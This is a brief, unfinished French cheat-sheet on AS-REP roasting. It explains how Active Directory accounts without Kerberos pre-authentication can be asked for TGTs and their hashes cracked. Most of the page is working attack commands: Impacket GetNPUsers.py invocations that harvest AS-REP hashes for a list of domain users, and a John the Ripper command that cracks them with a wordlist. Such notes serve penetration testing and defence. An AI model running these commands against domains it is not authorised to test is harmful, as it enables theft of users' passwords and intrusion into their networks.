---
description: A finir
---

# ASREP

Lors d’une demande de TGT, l’utilisateur doit, par défaut, s’authentifier auprès du KDC pour que celui-ci lui réponde. Il arrive que cette authentification ne soit pas toujours demandée. Si c'est le cas, n’importe qui peut demander un TGT (contenant le mot de passe sous forme de _hash_) au nom d’un de ces comptes.

### Récupération des tickets TGT

```
# Ne nécessite pas de compte mais requière de connaître tous les comptes du domaine
GetNPUsers.py <domain.local>/ -no-pass -usersfile users.txt

# Réalise une demande de TGT pour tous les comptes du domaine mais nécessite un compte 
GetNPUsers.py <domain.local>/<USER>:<PASS> -request -format john -outputfile hashs_<IP>.txt
```

### Cassage des _hashs_ obtenus

```
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
```
